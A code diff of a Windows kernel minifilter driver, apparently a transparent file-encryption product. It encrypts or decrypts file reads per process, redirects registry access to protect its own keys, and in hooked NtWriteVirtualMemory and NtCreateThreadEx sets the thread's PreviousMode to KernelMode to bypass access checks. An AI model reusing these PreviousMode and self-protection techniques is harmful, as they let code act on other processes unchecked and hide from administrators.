@@ -885,55 +1015,49 @@ FLT_PREOP_CALLBACK_STATUS PreRead(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS
     NTSTATUS status;
     ULONG readLen = iopb->Parameters.Read.Length;
     PFLT_FILE_NAME_INFORMATION nameInfo;
-    WCHAR filename[216] = {0};
+    WCHAR filename[216] = { 0 };
     ULONG uRet = 0;
+    ULONG pid = FltGetRequestorProcessId(Data);
+    ULONG CurentPid = PsGetCurrentProcessId();
     try {
 
         //get volume context
         status = FltGetVolumeContext(FltObjects->Filter, FltObjects->Volume, &volCtx);
-        if (!NT_SUCCESS(status))
-            __leave;
+        if (!NT_SUCCESS(status)) __leave;
 
         //get per-stream context, not used presently
         status = Ctx_FindOrCreateStreamContext(Data, FltObjects, FALSE, &pStreamCtx, NULL);
-        if (!NT_SUCCESS(status))
-            __leave;
+        if (!NT_SUCCESS(status)) __leave;
         //fast io path, disallow it, this will lead to an equivalent irp request coming in
         if (FLT_IS_FASTIO_OPERATION(Data)) {
             // disallow fast io path
-            LOG(LOGFL_INFO, ( "[PreRead] FLT_PREOP_DISALLOW_FASTIO"));
+            LOG(LOGFL_INFO, ("[PreRead] FLT_PREOP_DISALLOW_FASTIO"));
             retValue = FLT_PREOP_DISALLOW_FASTIO;
             __leave;
         }
 
         //cached io irp path
         if (!(Data->Iopb->IrpFlags & (IRP_NOCACHE | IRP_PAGING_IO | IRP_SYNCHRONOUS_PAGING_IO))) {
-            LOG(LOGFL_INFO, ( "[PreRead] This is Not IRP_NOCACHE IRP_PAGING_IO IRP_SYNCHRONOUS_PAGING_IO IrpFlags:%x", Data->Iopb->IrpFlags));
-            __leave;
+            LOG(LOGFL_INFO, ("[PreRead] Pid:%d  This is Not IRP_NOCACHE IRP_PAGING_IO IRP_SYNCHRONOUS_PAGING_IO:%x", pid, Data->Iopb->IrpFlags));
+//            __leave;
         }
 
         // read length is zero, pass
-        if (readLen == 0)
-            __leave;
-
-        //
+        if (readLen == 0) __leave;
         //  If this is a non-cached I/O we need to round the length up to the
         //  sector size for this device.  We must do this because the file
         //  systems do this and we need to make sure our buffer is as big
         //  as they are expecting.
-        //
 
         if (FlagOn(IRP_NOCACHE, iopb->IrpFlags)) {
 
             readLen = (ULONG)ROUND_TO_SIZE(readLen, volCtx->SectorSize);
         }
-
+//      __leave;
         //
         //  Allocate nonPaged memory for the buffer we are swapping to.
         //  If we fail to get the memory, just don't swap buffers on this
         //  operation.
-        //
-
         newBuf = ExAllocatePoolWithTag(NonPagedPool, readLen, BUFFER_SWAP_TAG);
         if (newBuf == NULL) {
             leave;
@@ -944,7 +1068,7 @@ FLT_PREOP_CALLBACK_STATUS PreRead(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS
         //  do this for a FASTIO operation since the FASTIO interface has no
         //  parameter for passing the MDL to the file system.
         //
-        RtlZeroMemory(newBuf, readLen);
+//        RtlZeroMemory(newBuf, readLen);
         if (FlagOn(Data->Flags, FLTFL_CALLBACK_DATA_IRP_OPERATION)) {
 
             //
@@ -980,7 +1104,7 @@ FLT_PREOP_CALLBACK_STATUS PreRead(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS
         //  Update the buffer pointers and MDL address, mark we have changed
         //  something.
         //
-        LOG(LOGFL_INFO, ("[PreRead]  p2pCtx:%p newBuf:%p newMdl:%p pStreamCtx:%p", p2pCtx, newBuf, newMdl, pStreamCtx));
+        LOG(LOGFL_INFO, ("[PreRead]  newBuf:%p newMdl:%p ", newBuf, newMdl));
         iopb->Parameters.Read.ReadBuffer = newBuf;
         iopb->Parameters.Read.MdlAddress = newMdl;
         FltSetCallbackDataDirty(Data);
@@ -989,6 +1113,7 @@ FLT_PREOP_CALLBACK_STATUS PreRead(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS
         //
         p2pCtx->SwappedBuffer = newBuf;
         p2pCtx->VolCtx = volCtx;
+        p2pCtx->pMdl = newMdl;
         p2pCtx->pStreamCtx = pStreamCtx;
         *CompletionContext = p2pCtx;
 
@@ -998,7 +1123,7 @@ FLT_PREOP_CALLBACK_STATUS PreRead(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS
 
         retValue = FLT_PREOP_SUCCESS_WITH_CALLBACK;
     }
-    finally {
+    finally{
 
         //
         //  If we don't want a post-operation callback, then cleanup state.
@@ -1019,6 +1144,7 @@ FLT_PREOP_CALLBACK_STATUS PreRead(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS
             }
         }
     }
+
     return retValue;
 }
 
@@ -1028,13 +1154,13 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
     IN PVOID CompletionContext,
     IN FLT_POST_OPERATION_FLAGS Flags)
 {
-    PVOID origBuf;
+    PVOID origBuf=NULL;
     PFLT_IO_PARAMETER_BLOCK iopb = Data->Iopb;
     FLT_POSTOP_CALLBACK_STATUS retValue = FLT_POSTOP_FINISHED_PROCESSING;
     BOOLEAN cleanupAllocatedBuffer = TRUE;
     PPRE_2_POST_CONTEXT p2pCtx = (PPRE_2_POST_CONTEXT)CompletionContext;
     ULONG pid = FltGetRequestorProcessId(Data);
-    //
+    KIRQL irql = KeGetCurrentIrql();
     //  This system won't draining an operation with swapped buffers, verify
     //  the draining flag is not set.
     //
@@ -1044,11 +1170,11 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
         //  If the operation failed or the count is zero, there is no data to
         //  copy so just return now.
         //
-
         if (!NT_SUCCESS(Data->IoStatus.Status) || (Data->IoStatus.Information == 0)) {
             leave;
         }
-
+        LOG(LOGFL_INFO, ("[PostRead] newBuf:%p newMdl:%p irql:%d pid:%d  Len:%d file:%ws", p2pCtx->SwappedBuffer, p2pCtx->pMdl, irql, pid,
+                         Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
         //
         //  We need to copy the read data back into the users buffer.  Note
         //  that the parameters passed in are for the users original buffers
@@ -1063,75 +1189,65 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
                 Data->IoStatus.Information = 0;
                 leave;
             }
-            LOG(LOGFL_INFO, ("[PostRead] pid:%d MmGetSystemAddressForMdlSafe ", pid));
-        } else if (FlagOn(Data->Flags, FLTFL_CALLBACK_DATA_SYSTEM_BUFFER) || FlagOn(Data->Flags, FLTFL_CALLBACK_DATA_FAST_IO_OPERATION)) {
+
+            LOG(LOGFL_INFO, ("[PostRead] MmGetSystemAddressForMdlSafe IRQL:%d Len:%d file:%ws",irql, Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
+
+        } else if (FlagOn(Data->Flags,FLTFL_CALLBACK_DATA_SYSTEM_BUFFER) || FlagOn(Data->Flags,FLTFL_CALLBACK_DATA_FAST_IO_OPERATION)) {
+            //
+            //  If this is a system buffer, just use the given address because
+            //      it is valid in all thread contexts.
+            //  If this is a FASTIO operation, we can just use the
+            //      buffer (inside a try/except) since we know we are in
+            //      the correct thread context (you can't pend FASTIO's).
+            //
             origBuf = iopb->Parameters.Read.ReadBuffer;
-            LOG(LOGFL_INFO, ("[PostRead] pid:%d FLTFL_CALLBACK_DATA_SYSTEM_BUFFER|FLTFL_CALLBACK_DATA_FAST_IO_OPERATION", pid));
+
         } else {
 
-            //            DbgPrint("[PostRead] call FltDoCompletionProcessingWhenSafe");
+            LOG(LOGFL_INFO, ("[PostRead] Call FltDoCompletionProcessingWhenSafe Len:%d file:%ws", Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
             if (FltDoCompletionProcessingWhenSafe(Data, FltObjects, CompletionContext, Flags, PostReadWhenSafe, &retValue)) {
-
-                //
-                //  This operation has been moved to a safe IRQL, the called
-                //  routine will do (or has done) the freeing so don't do it
-                //  in our routine.
-                //
                 cleanupAllocatedBuffer = FALSE;
             } else {
-                //                DbgPrint("[PostRead] call else");
+
                 Data->IoStatus.Status = STATUS_UNSUCCESSFUL;
                 Data->IoStatus.Information = 0;
-            }
+                LOG( LOGFL_INFO,("[PostRead]: %wZ Invalid user buffer, oldB=%p, status=%x\n",&p2pCtx->VolCtx->Name,origBuf,Data->IoStatus.Status) );
 
+            }
             leave;
         }
 
 
-//
-        //  We either have a system buffer or this is a fastio operation
-        //  so we are in the proper context.  Copy the data handling an
-        //  exception.
-        //
-        LOG(LOGFL_INFO, ("[PostRead] pid:%d p2pCtx:%p SwappedBuffer:%p pStreamCtx:%p pMdl:%p  Len:%d file:%ws", pid, p2pCtx, p2pCtx->SwappedBuffer, p2pCtx->pStreamCtx,
-                         p2pCtx->pMdl, Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
-        try {
 
+
+        try {
             PUCHAR   pOrigBuf = (PUCHAR)origBuf;
-            //除去explorer 全加密
             if (p2pCtx->pStreamCtx->uEncrypteType == 1) {
-                LOG(LOGFL_INFO, ("[PostRead] pid:%d encrypte len:%d file:%ws", pid, Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
+                LOG(LOGFL_INFO, ("[PostRead] pid:%d irql:%d Encrypte Len:%d file:%ws", pid,KeGetCurrentIrql(), Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
                 EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
             } else if (p2pCtx->pStreamCtx->uEncrypteType == 2) {
-                PEPROCESS ProcessObj = NULL;
-                if (NT_SUCCESS(PsLookupProcessByProcessId(pid, &ProcessObj))) {
-
-                    WCHAR exename[512] = { 0 };
-                    BOOLEAN bgetname = GetNameByObj(ProcessObj, exename);
-                    if (ProcessObj != NULL) ObfDereferenceObject(ProcessObj);
-
-                    if (_wcsicmp(exename, g_HexConfig[5]) == 0 || _wcsicmp(exename, g_HexConfig[6]) == 0) {
-                        LOG(LOGFL_INFO, ("[PostRead] pid:%d PsGetCurrentProcessId():%d exename:%ws  this is not encrypte  filename:%ws", pid, PsGetCurrentProcessId(), exename, p2pCtx->pStreamCtx->FileName.Buffer));
+                WCHAR exename[512] = { 0 };
+                BOOLEAN bgetname = GetNameByObj(FltGetRequestorProcess(Data), exename);
+                if (bgetname) {
+                    if (_wcsicmp(exename, g_HexConfig[4]) == 0 || _wcsicmp(exename, g_HexConfig[5]) == 0) {
+                        LOG(LOGFL_INFO, ("[PostRead] exename:%ws not encrypte Len:%d filename:%ws", exename,Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
                         EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, FALSE);
                     } else {
-                        LOG(LOGFL_INFO, ("[PostRead] pid:%d PsGetCurrentProcessId():%d exename:%ws  this is  encrypte  filename:%ws", pid, PsGetCurrentProcessId(), exename, p2pCtx->pStreamCtx->FileName.Buffer));
+                        LOG(LOGFL_INFO, ("[PostRead] exename:%ws	 encrypte Len:%d filename:%ws", exename,Data->IoStatus.Information,irql,p2pCtx->pStreamCtx->FileName.Buffer));
                         EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
                     }
+
                 }
-
-
             }
+
         }
-
-        __except(EXCEPTION_EXECUTE_HANDLER) {
-            ULONG code = GetExceptionCode();
+        except (EXCEPTION_EXECUTE_HANDLER) {
+            Data->IoStatus.Status = GetExceptionCode();
+            Data->IoStatus.Information = 0;
         }
-
-
-
 
     }
-    finally {
+    finally{
 
         //
         //  If we are supposed to, cleanup the allocated memory and release
@@ -1141,7 +1257,6 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
         //        DbgPrint("[PostRead] finally cleanupAllocatedBuffer:%d",cleanupAllocatedBuffer);
         if (cleanupAllocatedBuffer)
         {
-
             ExFreePool(p2pCtx->SwappedBuffer);
             FltReleaseContext(p2pCtx->VolCtx);
             FltReleaseContext(p2pCtx->pStreamCtx);
@@ -1152,86 +1267,77 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
     return retValue;
 }
 
-///**
-// * [PostReadWhenSafe description]
-// * @Author   zzc
-// * @DateTime 2019年6月18日T6:59:43+0800
-// * @param    Data                     [Pointer to the filter callbackData that is passed to us]
-// * @param    FltObjects               [Pointer to the FLT_RELATED_OBJECTS data structure containing opaque handles to this filter, instance, its associated volume and file object]
-// * @param    CompletionContext        [Contains state from our PreOperation callback]
-// * @param    Flags                    [Denotes whether the completion is successful or is being drained]
-// * @return                            [FLT_POSTOP_FINISHED_PROCESSING - This is always returned.]
-// */
+/**
+ * [PostReadWhenSafe description]
+ * @Author   zzc
+ * @DateTime 2019年6月18日T6:59:43+0800
+ * @param    Data                     [Pointer to the filter callbackData that is passed to us]
+ * @param    FltObjects               [Pointer to the FLT_RELATED_OBJECTS data structure containing opaque handles to this filter, instance, its associated volume and file object]
+ * @param    CompletionContext        [Contains state from our PreOperation callback]
+ * @param    Flags                    [Denotes whether the completion is successful or is being drained]
+ * @return                            [FLT_POSTOP_FINISHED_PROCESSING - This is always returned.]
+ */
 FLT_POSTOP_CALLBACK_STATUS PostReadWhenSafe(IN OUT PFLT_CALLBACK_DATA Data, IN PCFLT_RELATED_OBJECTS FltObjects, IN PVOID CompletionContext, IN FLT_POST_OPERATION_FLAGS Flags)
 {
     PFLT_IO_PARAMETER_BLOCK iopb = Data->Iopb;
     PPRE_2_POST_CONTEXT p2pCtx = CompletionContext;
     PVOID origBuf;
     NTSTATUS status;
+    KIRQL irql = KeGetCurrentIrql();
     UNREFERENCED_PARAMETER(FltObjects);
     UNREFERENCED_PARAMETER(Flags);
     ASSERT(Data->IoStatus.Information != 0);
     status = FltLockUserBuffer(Data);
-
     if (!NT_SUCCESS(status)) {
-
         //
         //  If we can't lock the buffer, fail the operation
         //
         Data->IoStatus.Status = status;
         Data->IoStatus.Information = 0;
     } else {
+        ULONG pid = FltGetRequestorProcessId(Data);
+        LOG(LOGFL_INFO, ("[PostReadWhenSafe] irql:%d pid:%d newBuf:%p newMdl:%p  Len:%d file:%ws",
+                         irql,pid, p2pCtx->SwappedBuffer, p2pCtx->pMdl,
+                         Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
         origBuf = MmGetSystemAddressForMdlSafe(iopb->Parameters.Read.MdlAddress, NormalPagePriority);
         if (origBuf == NULL) {
-
             //
             //  If we couldn't get a SYSTEM buffer address, fail the operation
             //
             Data->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
             Data->IoStatus.Information = 0;
         } else {
-            try {
-                ULONG pid = FltGetRequestorProcessId(Data);
-                PUCHAR   pOrigBuf = (PUCHAR)origBuf;
-                //除去explorer 全加密
-                if (p2pCtx->pStreamCtx->uEncrypteType == 1) {
-                    LOG(LOGFL_INFO, ("[PostRead] pid:%d encrypte len:%d file:%ws", pid, Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
-                    EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
-                } else if (p2pCtx->pStreamCtx->uEncrypteType == 2) {
-                    PEPROCESS ProcessObj = NULL;
-
-                    if (NT_SUCCESS(PsLookupProcessByProcessId(pid, &ProcessObj))) {
-
-                        WCHAR exename[512] = { 0 };
-                        BOOLEAN bgetname = GetNameByObj(ProcessObj, exename);
-                        if (ProcessObj != NULL) ObfDereferenceObject(ProcessObj);
-
-                        if (_wcsicmp(exename, g_HexConfig[5]) == 0 || _wcsicmp(exename, g_HexConfig[6]) == 0) {
-                            LOG(LOGFL_INFO, ("[PostRead] pid:%d PsGetCurrentProcessId():%d exename:%ws this is not encrypte filename:%ws", pid, PsGetCurrentProcessId(), exename, p2pCtx->pStreamCtx->FileName.Buffer));
-                            EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, FALSE);
-                        } else {
-                            LOG(LOGFL_INFO, ("[PostRead] pid:%d PsGetCurrentProcessId():%d exename:%ws this is  encrypte filename:%ws", pid, PsGetCurrentProcessId(), exename, p2pCtx->pStreamCtx->FileName.Buffer));
-                            EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
-                        }
+            PUCHAR   pOrigBuf = (PUCHAR)origBuf;
+            if (p2pCtx->pStreamCtx->uEncrypteType == 1) {
+                LOG(LOGFL_INFO, ("[PostReadWhenSafe] pid:%d irql:%d Encrypte Len:%d file:%ws", pid,KeGetCurrentIrql(), Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
+                EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
+            } else if (p2pCtx->pStreamCtx->uEncrypteType == 2) {
+                WCHAR exename[512] = { 0 };
+                BOOLEAN bgetname = GetNameByObj(FltGetRequestorProcess(Data), exename);
+                if (bgetname) {
+                    if (_wcsicmp(exename, g_HexConfig[4]) == 0 || _wcsicmp(exename, g_HexConfig[5]) == 0) {
+                        LOG(LOGFL_INFO, ("[PostRead] exename:%ws not encrypte Len:%d filename:%ws", exename,Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
+                        EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, FALSE);
+                        // RtlCopyMemory(origBuf, p2pCtx->SwappedBuffer, Data->IoStatus.Information);
+                    } else {
+                        LOG(LOGFL_INFO, ("[PostRead] exename:%ws	 encrypte Len:%d filename:%ws", exename,Data->IoStatus.Information,irql,p2pCtx->pStreamCtx->FileName.Buffer));
+                        EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
                     }
-
 
                 }
             }
-            __except(EXCEPTION_EXECUTE_HANDLER) {
-                ULONG code = GetExceptionCode();
-            }
+
         }
     }
 
     //
     //  Free allocated memory and release the volume context
     //
-
     ExFreePool(p2pCtx->SwappedBuffer);
     FltReleaseContext(p2pCtx->VolCtx);
     FltReleaseContext(p2pCtx->pStreamCtx);
     ExFreeToNPagedLookasideList(&Pre2PostContextList, p2pCtx);
+
     return FLT_POSTOP_FINISHED_PROCESSING;
 }
 
@@ -1254,7 +1360,7 @@ DWORD_PTR GetSystemRoutineAddress(WCHAR *szFunCtionAName)
 NTSTATUS RegCallBack(PVOID CallbackContext, PVOID Argument1, PVOID Argument2)
 {
     NTSTATUS status = STATUS_SUCCESS;
-    UNICODE_STRING ustrRegPath = {0};
+    UNICODE_STRING ustrRegPath = { 0 };
     LONG lOperateType = (LONG)Argument1;
     LONG NotifyClass = (LONG)Argument1;
     UNREFERENCED_PARAMETER(CallbackContext);
@@ -1264,126 +1370,86 @@ NTSTATUS RegCallBack(PVOID CallbackContext, PVOID Argument1, PVOID Argument2)
         case RegNtPreCreateKeyEx:
         case RegNtPreOpenKeyEx: {
             PREG_CREATE_KEY_INFORMATION KeyInfo = (PREG_CREATE_KEY_INFORMATION)Argument2;
-            WCHAR exename[216] = {0};
-            WCHAR PathReg[512] = {0};
-            PUNICODE_STRING RootKeyName;
+            WCHAR exename[216] = { 0 };
+            WCHAR PathReg[512] = { 0 };
+            WCHAR Key[512] = { 0 };
+            PUNICODE_STRING RootKeyName = NULL;
+            UNICODE_STRING registryPath;
+            BOOLEAN  bFind = FALSE;
+            BOOLEAN  bGetName = FALSE;
+            PUNICODE_STRING pCommonStr = NULL;
+            NTSTATUS st = STATUS_UNSUCCESSFUL;
             if (MmIsAddressValid(KeyInfo) && MmIsAddressValid(KeyInfo->CompleteName)) {
-                PUNICODE_STRING pPath = KeyInfo->CompleteName;
-                WCHAR key[512] = {0};
-                if (GetNameByUnicodeString(pPath, key)) {
-                    WCHAR exename[512] = {0};
-                    UNICODE_STRING FullKeyName = {0};
-                    ULONG udesire = KEY_ALL_ACCESS | KEY_WOW64_64KEY;
-                    if (_wcsicmp(key, g_HexConfig[9]) == 0) {
+                st = LfGetObjectName(KeyInfo->RootObject, &RootKeyName, KeyInfo->CompleteName);
+                if (NT_SUCCESS(st)) {
+                    WCHAR *pfind = NULL;
+                    if (RootKeyName) {
+                        RtlCopyMemory(PathReg, RootKeyName->Buffer, RootKeyName->Length);
+                        kfree(RootKeyName);
+                    } else {
+                        RtlCopyMemory(PathReg, KeyInfo->CompleteName->Buffer, KeyInfo->CompleteName->Length);
+                    }
+                    pfind = wcsrchr(PathReg, L'\\');
+                    if (pfind) {
+                        pfind++;
+                        if (_wcsicmp(pfind, g_HexConfig[8]) == 0) {
+                            if (wcsstr(PathReg, g_HexConfig[7])) {
 
-                        WCHAR *pslr = NULL;
-                        BOOLEAN bGetName = FALSE;
+                                BOOLEAN bGetExeName = FALSE;
+                                bGetExeName = GetNameByObj(PsGetCurrentProcess(), exename);
+                                if (bGetExeName && _wcsicmp(g_HexConfig[4], exename) != 0) {
+                                    BOOLEAN bRedirect = TRUE;
+                                    ULONG udesire = KEY_ALL_ACCESS | KEY_WOW64_64KEY;
+                                    if (KeyInfo->DesiredAccess == KEY_ALL_ACCESS || KeyInfo->DesiredAccess == udesire) {
+                                        if (KeyInfo->GrantedAccess == 0 && KeyInfo->CreateOptions == 0) bRedirect = FALSE;
+                                        else bRedirect = TRUE;
+                                    } else bRedirect = TRUE;
+                                    if (bRedirect == TRUE) {
+                                        LOG(LOGFL_INFO, ("[RegCallBack] pid:%d exename:%ws   Redirec PathReg:%ws", PsGetCurrentProcessId(), exename, PathReg));
+                                        status = RedirectReg(KeyInfo, NotifyClass, g_HexConfig[6]);
+                                    } else {
+                                        LOG(LOGFL_INFO, ("[RegCallBack] pid:%d exename:%ws is not Redirec DesiredAccess:%x  GrantedAccess:%x  Disposition:%x CreateOptions:%x",
+                                                         PsGetCurrentProcessId(), exename, KeyInfo->DesiredAccess, KeyInfo->GrantedAccess, KeyInfo->Disposition,
+                                                         KeyInfo->CreateOptions));
+                                    }
+                                } else LOG(LOGFL_INFO, ("[RegCallBack] pid:%d exename:%ws   is not Redirec PathReg:%ws", PsGetCurrentProcessId(), exename, PathReg));
 
-                        status = LfGetObjectName(KeyInfo->RootObject, &RootKeyName);
-                        if (NT_SUCCESS(status)) {
-                            _wcslwr(RootKeyName->Buffer, RootKeyName->Length);
-
-                            if (wcsstr(RootKeyName->Buffer, g_HexConfig[12])) {
-                                //L"explorer\\shelliconoverlayidentifiers"
-                                kfree(RootKeyName);
-                                goto LABEL1;
                             }
-                            kfree(RootKeyName);
-                        }
+                        } else if (_wcsicmp(pfind, g_HexConfig[9]) == 0) {
+                            BOOLEAN bGetExeName = FALSE;
+                            _wcslwr(PathReg);
+                            if (wcsstr(PathReg, g_HexConfig[10]) != NULL) {
+                                bGetExeName = GetNameByObj(PsGetCurrentProcess(), exename);
+                                if (bGetExeName && _wcsicmp(g_HexConfig[11], exename) != 0) {
+                                    BOOLEAN bRedirect = TRUE;
+                                    ULONG udesire = KEY_ALL_ACCESS_;
 
-                        pslr = _wcslwr(pPath->Buffer, pPath->Length);
-                        //pslr:software\microsoft\windows\currentversion\explorer\shelliconoverlayidentifiers\0overlayicon
-                        if (wcsstr(pslr, g_HexConfig[12])) {
-                            //L"shelliconoverlayidentifiers\\0overlayIcon"
-                        LABEL1:
-                            bGetName = GetNameByObj(PsGetCurrentProcess(), exename);
-                            if (bGetName && _wcsicmp(g_HexConfig[5], exename) != 0) {
-                                //L"explorer.exe"
-                                BOOLEAN bRedirect = TRUE;
-                                //L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\Offline Files"
-                                if (KeyInfo->DesiredAccess == KEY_ALL_ACCESS || KeyInfo->DesiredAccess == udesire) {
-                                    if (KeyInfo->GrantedAccess == 0 && KeyInfo->CreateOptions == 0)
-                                        bRedirect = FALSE;
-                                    else
-                                        bRedirect = TRUE;
-                                } else
-                                    bRedirect = TRUE;
-                                if (bRedirect == TRUE) {
-                                    status = RedirectReg(KeyInfo, NotifyClass, g_HexConfig[7]);
-                                } else {
-                                    kprintf("DesiredAccess:%x  GrantedAccess:%x  Disposition:%x CreateOptions:%x", KeyInfo->DesiredAccess, KeyInfo->GrantedAccess, KeyInfo->Disposition, KeyInfo->CreateOptions);
-                                    kprintf("udesire:%x  KEY_ALL_ACCESS:%x", udesire, KEY_ALL_ACCESS);
+                                    if (udesire != KeyInfo->DesiredAccess) {
+                                        LOG(LOGFL_INFO, ("[RegCallBack]   pid:%d exename:%ws	 Redirec PathReg:%ws", PsGetCurrentProcessId(), exename, PathReg));
+                                        status = RedirectReg(KeyInfo, NotifyClass, g_HexConfig[6]);
+                                    } else LOG(LOGFL_INFO, ("[RegCallBack] pid:%d exename:%ws is not Redirec PathReg:%ws", PsGetCurrentProcessId(), exename, PathReg));
+
+
                                 }
                             }
-                        }
-                    } else if (_wcsicmp(key, g_HexConfig[10]) == 0) {
-                        //L"msprotect"
-                        WCHAR *pslr = _wcslwr(pPath->Buffer, pPath->Length);
 
-                        if (wcsstr(pslr, g_HexConfig[11]) != NULL) {
-                            //L"services\\msprotect"
-                            BOOLEAN bGetName = GetNameByObj(PsGetCurrentProcess(), exename);
-                            if (bGetName && _wcsicmp(g_HexConfig[13], exename) != 0) {
-                                kprintf("exename:%ws Path:%wZ", exename, pPath);
-                                kprintf("DesiredAccess:%x  GrantedAccess:%x  Disposition:%x CreateOptions:%x", KeyInfo->DesiredAccess, KeyInfo->GrantedAccess, KeyInfo->Disposition, KeyInfo->CreateOptions);
-                                //L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\services\\ACPI"
-
-                                status = RedirectReg(KeyInfo, NotifyClass, g_HexConfig[7]); //g_strAll[3]   g_strAll[4]--
-                            }
                         }
+
                     }
+
                 }
+
             }
         }
-        break;
-            //case RegNtPreSetValueKey: {
-            //    PREG_SET_VALUE_KEY_INFORMATION KeyInfo = (PREG_SET_VALUE_KEY_INFORMATION)Argument2;
-            //    PUNICODE_STRING             RootKeyName;
-            //    NTSTATUS  s1= LfGetObjectName( KeyInfo->Object, &RootKeyName );
-            //    if (NT_SUCCESS(s1)) {
-
-            //        WCHAR   key[512] = { 0 };
-            //        if (GetNameByUnicodeString(RootKeyName, key)) {
-            //            if(_wcsicmp(key,L"Offline Files")==0) {
-            //                DbgPrint("[RegNtPreSetValueKey]KeyPath: %wZ",RootKeyName);
-            //                DbgPrint("[RegNtPreSetValueKey]ValName: %wZ",KeyInfo->ValueName);
-            //                status = STATUS_ACCESS_DENIED;
-
-            //            }
-            //        }
-            //        kfree(RootKeyName);
-
-            //    }
-
-            //    break;
-            //}
-            //case RegNtPreDeleteKey: {
-            //    PREG_DELETE_KEY_INFORMATION KeyInfo = (PREG_DELETE_KEY_INFORMATION)Argument2;
-            //    PUNICODE_STRING             RootKeyName;
-            //    NTSTATUS  s1= LfGetObjectName( KeyInfo->Object, &RootKeyName );
-            //    if (NT_SUCCESS(s1)) {
-            //        WCHAR   key[512] = { 0 };
-            //        if (GetNameByUnicodeString(RootKeyName, key)) {
-            //     DbgPrint("[RegNtPreDeleteKey] KeyPath: %wZ",RootKeyName);
-            //            if(_wcsicmp(key,L"Offline Files")==0) {
-            //                status = STATUS_ACCESS_DENIED;
-            //            }
-            //        }
-            //        kfree(RootKeyName);
-
-            //    }
-
-            //    break;
-            //}
     }
     return status;
 }
 
+
+
 NTSTATUS SetRegisterCallback()
 {
     NTSTATUS status = CmRegisterCallback(RegCallBack, NULL, &g_liRegCookie);
-
-
     if (!NT_SUCCESS(status)) {
         DbgPrint("CmRegisterCallback", status);
         g_liRegCookie.QuadPart = 0;
@@ -1398,6 +1464,7 @@ VOID RemoveRegisterCallback()
 {
     if (0 < g_liRegCookie.QuadPart) {
         CmUnRegisterCallback(g_liRegCookie);
+        g_liRegCookie.QuadPart = NULL;
     }
 }
 
@@ -1405,8 +1472,7 @@ NTSTATUS BBSearchPattern(IN PUCHAR pattern, IN UCHAR wildcard, IN ULONG_PTR len,
 {
     ULONG_PTR i, j;
 
-    if (ppFound == NULL || pattern == NULL || base == NULL)
-        return STATUS_INVALID_PARAMETER;
+    if (ppFound == NULL || pattern == NULL || base == NULL) return STATUS_INVALID_PARAMETER;
 
     for (i = 0; i < size - len; i++) {
         BOOLEAN found = TRUE;
@@ -1435,6 +1501,7 @@ NTSTATUS NTAPI NewNtWriteVirtualMemory(IN HANDLE ProcessHandle, IN PVOID BaseAdd
     PVOID pFoundPattern = NULL;
     UCHAR PreviousModePattern[] = "\x00\x00\xC3";
     ULONG PrevMode = 0;
+    PrevMode = 0;
 
     if (pfnNtWriteVirtualMemory) {
         if (g_mode) {
@@ -1452,8 +1519,7 @@ NTSTATUS NTAPI NewNtWriteVirtualMemory(IN HANDLE ProcessHandle, IN PVOID BaseAdd
                 *pPrevMode = prevMode;
             }
         }
-    } else
-        status = STATUS_NOT_FOUND;
+    } else status = STATUS_NOT_FOUND;
 
     return status;
 }
@@ -1473,7 +1539,7 @@ NTSTATUS NTAPI NewNtCreateThreadEx(PHANDLE hThread, ACCESS_MASK DesiredAccess, P
             PUCHAR pPrevMode = (PUCHAR)PsGetCurrentThread() + g_mode;
             UCHAR prevMode = *pPrevMode;
             *pPrevMode = KernelMode;
-            status = pfnNtCreateThreadEx(hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, Flags, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
+            status = NtCreateThreadEx(hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, Flags, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
             *pPrevMode = prevMode;
         } else {
             if (NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern))) {
